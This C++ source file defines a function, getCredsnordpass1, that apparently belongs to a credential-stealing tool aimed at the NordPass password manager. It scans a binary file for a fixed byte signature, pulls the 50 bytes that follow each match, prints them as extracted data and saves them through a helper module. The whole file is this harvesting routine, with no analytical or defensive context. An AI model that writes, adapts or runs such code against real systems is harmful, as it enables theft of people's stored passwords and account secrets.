#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include "../../core/saveFile.h"

int getCredsnordpass1(std::string filename) {
    std::ifstream file(filename, std::ios::binary);

    if (!file.is_open()) {
        std::cerr << "Error opening the file." << std::endl;
        return 1;
    }

    std::vector<unsigned char> searchPattern = { 0x00, 0x9d, 0x05, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x12, 0x00, 0x00 };
    std::vector<unsigned char> foundData;

    while (!file.eof()) {
        unsigned char c;
        file.read(reinterpret_cast<char*>(&c), sizeof(c));

        if (c == searchPattern[foundData.size()]) {
            foundData.push_back(c);
            if (foundData.size() == searchPattern.size()) {
                // We found the search pattern, now collect the next 50 characters
                std::vector<unsigned char> extractedData;
                
                for (int i = 0; i < 50 && !file.eof(); ++i) {
                    file.read(reinterpret_cast<char*>(&c), sizeof(c));
                    extractedData.push_back(c);
                }

                // Convert the binary data to a UTF-8 string
                std::string utf8ExtractedData(extractedData.begin(), extractedData.end());

                // Print the extracted UTF-8 string
                std::cout << "Extracted Data: " << utf8ExtractedData << std::endl;

                // Save into file
                saveFile(utf8ExtractedData);

                foundData.clear();
            }
        } else {
            foundData.clear();
        }
    }

    file.close();
    return 0;
}
